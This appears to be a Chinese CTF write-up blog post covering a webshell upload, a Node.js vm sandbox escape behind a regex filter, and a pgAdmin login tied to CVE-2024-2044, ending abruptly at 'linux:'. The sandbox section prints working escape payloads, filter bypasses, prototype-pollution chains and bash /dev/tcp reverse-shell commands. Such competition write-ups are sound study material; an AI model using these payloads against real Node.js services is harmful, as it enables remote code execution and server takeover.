<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7442b9.png" alt="image-20240325200213692"></p>
<p>有文件上传系统</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441df1c4ce8.png" alt="image-20240325200326549"></p>
<p>可以通过写马进行后门连接</p>
<p>可以直接命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db642389.png" alt="image-20240325200721766"></p>
<p>要run两次可以执行一次命令</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db6adb47.png" alt="image-20240325200813773"></p>
<p>发现flag文件</p>
<p>直接cat</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db5cdee4.png" alt="image-20240325201230264"></p>
<h2 id="全世界最简单的CTF"><a href="#全世界最简单的CTF" class="headerlink" title="全世界最简单的CTF"></a>全世界最简单的CTF</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db5bbfa6.png" alt="image-20240325201353536"></p>
<p>进来后只有一个这个界面</p>
<p>只能执行js代码</p>
<p>dirsearch扫一下</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dbb23901.png" alt="image-20240325202349709"></p>
<p>发现泄露 secret</p>
<p>访问</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db77fdbd.png" alt="image-20240325202543022"></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line">app</span><br><span class="line">.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line">.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>))</span><br><span class="line">.<span class="title function_">use</span>(express.<span class="title function_">static</span>(<span class="string">&#x27;public&#x27;</span>))</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line">res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&#x27;/public/home.html&#x27;</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> pattern = /(process|\[.*?\]|exec|spawn|<span class="title class_">Buffer</span>|\\|\+|concat|<span class="built_in">eval</span></span><br><span class="line">|<span class="title class_">Function</span>)/g;</span><br><span class="line"><span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line"><span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="title function_">waf</span>(code)</span><br><span class="line"><span class="keyword">let</span> result = vm.<span class="title function_">runInContext</span>(code, context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(result);</span><br><span class="line">&#125; <span class="keyword">catch</span> (e)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;./hack&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">()=&gt;</span>&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;listen on 3000&quot;</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>交给ai后发现是vm沙箱逃逸</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9777b3.png" alt="image-20240325203526702"></p>
<p>我也是卡在这里</p>
<p>有waf</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> pattern = /(process|\[.*?\]|exec|spawn|<span class="title class_">Buffer</span>|\\|\+|concat|<span class="built_in">eval</span></span><br><span class="line">|<span class="title class_">Function</span>)/g;</span><br><span class="line"><span class="keyword">if</span>(code.<span class="title function_">match</span>(pattern))&#123;</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;what can I say? hacker out!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>随便在网上找了个payload来打</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return process&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">return</span> p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>但是waf过滤了几乎所以绕过</p>
<p>至少在比赛的这两天 我们尝试了网上能找到的几乎所以绕过方式 也没法绕过</p>
<p>我们也是卡在这里 没有解决</p>
<p>至此 有三种方式可以继续向下完成这道题</p>
<h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p>继续绕过  果然 还有我们没想到的绕过方法可以继续</p>
<p>waf不允许出现[] exec process</p>
<p>process我们有两种方法绕过</p>
<p>一种是 String.fromCharCode 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cc.constructor.constructor(&#x27;return process&#x27;)==cc.constructor.constructor(String.fromCharCode(114, 101, 116, 117, 114, 110, 32, 112, 114, 111, 99, 101, 115, 115)</span><br></pre></td></tr></table></figure>

<p>第二种我们可以发现他正则匹配没有i 也就是对大小写不敏感 我们可以通过js里面的 toLowerCase()绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return process==&#x27;return Process&#x27;.toLowerCase();</span><br></pre></td></tr></table></figure>



<p>接下来我们看最难的exec绕过，这个东西不是字符串，而是方法，所以我们并不能像之前两种方式绕过，我们选择 Reflect.get 方法绕过</p>
<blockquote>
<p>nodejs的命令执行绕过：</p>
<p>文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<p>在js中，需要使用Reflect这个关键字来实现反射调用函数的方式。譬如要得到eval函数，可以首先通过Reflect.ownKeys(global)拿到所有函数，然后global[Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’))]即可得到eval<br>console.log(Reflect.ownKeys(global))<br>&#x2F;&#x2F;返回所有函数<br>console.log(global[Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eval’))])<br>&#x2F;&#x2F;拿到eval<br>拿到eval之后，就可以常规思路rce了<br><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))](&#39;global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#39;)</code><br>这里虽然有可能被检测到的关键字，但由于mainModule、global、child_process等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。<br><code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))](&#39;\x67\x6c\x6f\x62\x61\x6c\x5b\x52\x65\x66\x6c\x65\x63\x74\x2e\x6f\x77\x6e\x4b\x65\x79\x73\x28\x67\x6c\x6f\x62\x61\x6c\x29\x2e\x66\x69\x6e\x64\x28\x78\x3d\x3e\x78\x2e\x69\x6e\x63\x6c\x75\x64\x65\x73\x28\x27\x65\x76\x61\x6c\x27\x29\x29\x5d\x28\x27\x67\x6c\x6f\x62\x61\x6c\x2e\x70\x72\x6f\x63\x65\x73\x73\x2e\x6d\x61\x69\x6e\x4d\x6f\x64\x75\x6c\x65\x2e\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72\x2e\x5f\x6c\x6f\x61\x64\x28\x22\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73\x22\x29\x2e\x65\x78\x65\x63\x53\x79\x6e\x63\x28\x22\x63\x75\x72\x6c\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31\x3a\x31\x32\x33\x34\x22\x29\x27\x29&#39;)</code><br>这里还有个小trick，如果过滤了eval关键字，可以用includes(‘eva’)来搜索eval函数，也可以用startswith(‘eva’)来搜索</p>
<p>3.3 过滤中括号的情况<br>在3.2中，获取到eval的方式是通过global数组，其中用到了中括号[]，假如中括号被过滤，可以用Reflect.get来绕<br>Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。<br>所以取eval函数的方式可以变成<br>Reflect.get(global, Reflect.ownKeys(global).find(x&#x3D;&gt;x.includes(‘eva’)))<br>后面拼接上命令执行的payload即可。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db7c10cf.png" alt="image-20240325204728449"></p>
<p>所以 根据你提供的对象的键获取到对应的值 是不是和数组的索引有点像呢，我们用他来绕过</p>
<p>payload:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return global&#x27;</span></span>))();</span><br><span class="line">            <span class="keyword">const</span> a = <span class="title class_">Reflect</span>.<span class="title function_">get</span>(p, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(p).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;pro&#x27;</span>))).<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">99</span>,<span class="number">104</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">100</span>,<span class="number">95</span>,<span class="number">112</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">115</span>,<span class="number">115</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="title class_">Reflect</span>.<span class="title function_">get</span>(a, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(a).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>反弹shell拿flag</p>
<p>注：一定要是公网ip kali的ip监听不到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db61a919.png" alt="image-20240325211333596"></p>
<p>直接&#x2F;readflag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441dbaa00ec.png" alt="image-20240325211422360"></p>
<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><p>vm1漏洞加了一点限制，没有this 指针，但是因为有try，可以抛出异常来逃逸，payload如下</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&#x27;whoami&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//一样的思路 但是是反弹shell</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;,&#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> b = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span></span><br><span class="line">        <span class="keyword">const</span> p = (b.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">        <span class="keyword">const</span> e = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">        <span class="keyword">const</span> c= <span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="title class_">Reflect</span>.<span class="title function_">get</span>(e, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(e).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">&#x27;ex&#x27;</span>)))(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip+/ 0&gt;&amp;1&quot;&#x27;</span>));</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db647a38.png" alt="image-20240325211540945"></p>
<p>也是直接读&#x2F;readflag</p>
<p>环境问题 此方法没有弹出flag 但正常情况下一定能出</p>
<h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><p>根据源码可以看出是一个 vm 逃逸，但是 waf 过于强大，导致没法逃逸执行命令，只能另辟蹊径，可以发现 &#x2F;secret 中对 process.__filename 有一个判断，</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/secret&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(process.<span class="property">__filename</span> == <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(__filename, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">let</span> content = fs.<span class="title function_">readFileSync</span>(process.<span class="property">__filename</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> res.<span class="title function_">send</span>(content);</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>正常情况下，process 是没有__filename 这个属性的，猜测这里可以<strong>原型链污染</strong>，从而任意读取文件，回过来看逃逸这里，arguments.callee.caller 可以获取到沙盒外的一个对象，所以我们这里可以进行污染，如：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"><span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__filename</span> = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>这样就污染了 Object 的<code>__filename</code>属性，process 因为找不到<code>__filename </code>这个属性，就会到prototype 里去找，最终在 Object 找到这个属性，观察源码可以发现 require(‘.&#x2F;hack’) ，污染 process.__filename 为 &#x2F;app&#x2F;hack.js ，访问 &#x2F;secret，读取到 hack.js 的内容为 :</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;shell.js&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p>继续读取 shell.js：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shell&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> p = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line">p.<span class="title function_">execSync</span>(process.<span class="property">env</span>.<span class="property">command</span>);</span><br></pre></td></tr></table></figure>

<p>这里很明显 process.env.command 也能进行污染控制，问题是怎么 include shell.js，漏洞点在 require(‘&#x2F;hack’) ，打断点进入 require 方法调试，可以发现里面可以通过原型链污染控制某些属性的值，可以达到任意文件包含的效果，调试过程可以<a target="_blank" rel="noopener" href="https://hujiekang.top/posts/nodejs-require-rce/">参考</a>，我们构造 payload 包含 shell.js，就可以 rce 了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line"><span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">data</span> = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;./hack&quot;</span>,<span class="string">&quot;exports&quot;</span>: </span><br><span class="line"><span class="string">&quot;./shell.js&quot;</span>&#125;;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">path</span> = <span class="string">&quot;/app&quot;</span>;</span><br><span class="line">cc.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">command</span> = <span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/</span></span><br><span class="line"><span class="string">tcp/vps/port 0&gt;&amp;1&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>也是反弹shell</p>
<p>同样读&#x2F;readflag 即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db78d510.png" alt="image-20240325213743878"></p>
<h2 id="attack-tacoooooooo"><a href="#attack-tacoooooooo" class="headerlink" title="attack_tacoooooooo"></a>attack_tacoooooooo</h2><p>这道题也是有思路吧</p>
<p>题目描述：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db667191.png" alt="image-20240325214022039"></p>
<p>进入容器</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db856501.png" alt="image-20240325214417999"></p>
<p>开始时也是发现url上有参数 尝试sql 无果</p>
<p>回头看题目描述 得到账号：<a href="mailto:&#116;&#97;&#99;&#111;&#x6f;&#111;&#111;&#x6f;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#116;&#97;&#99;&#111;&#x6f;&#111;&#111;&#x6f;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a></p>
<p>然后就产生爆破密码 6000的字典没有爆出 感觉应该不是这样写的</p>
<p>抓包：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9aab6e.png" alt="image-20240325214820515"></p>
<p>传密码123 回显：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db64385d.png" alt="image-20240325215028893"></p>
<p>密码不对</p>
<p>然后我发现容器叫：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db5dc77c.png" alt="image-20240325215113200"></p>
<p>所以尝试密码为pgAdmin4</p>
<p>回显：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db5df72e.png" alt="image-20240325215209147"></p>
<p>到这里我感觉其实密码就是pgAdmin4</p>
<p>结合抓包结果</p>
<p>cookie中有 pga4_session</p>
<p>post传参有： csrf_token</p>
<p>再结合研究这道题后 查找出资料发现 这道题可能是：CVE-2024 2044</p>
<p>CVE-2024 2044的漏洞复现：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db9b7725.png" alt="image-20240325215735767"></p>
<p>也有pga4_session 极有可能是 </p>
<p>最后发现CVE-2024 2044其实跟pickle反序列化有关 </p>
<p>再结合我输入pgAdmin4的回显 </p>
<p>至此 我认为我的思路清晰了 通过pickle反序列化将cookie覆盖 然后登录进入</p>
<p>但是 我根本不知道要将cookie覆盖成什么 卡死在这里</p>
<p>看完wp后发现其实可以直接登录进入</p>
<p>密码是tacooooo  <strong>怎么说呢 回显误我QAQ</strong></p>
<p>进入：<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/15/66441db83beef.png" alt="image-20240325221234776"></p>
<p>然后呢</p>
<p>请看此[文章](<a target="_blank" rel="noopener" href="https://www.shielder.com/advisories/pgadmin-path-traversal_leads_to_unsafe_deserialization_and_rce/">屏蔽器 - pgAdmin （&lt;&#x3D;8.3） 会话处理中的路径遍历会导致不安全的反序列化和远程代码执行 （RCE） (shielder.com)</a>)</p>
<p>反正我在国内没找到有用的CVE-2024 2044的文章</p>
<p>所以CVE-2024 2044与pickle反序列化的思路是没问题的</p>
<p>根据文章复现漏洞即可</p>
<p>linux:</p>
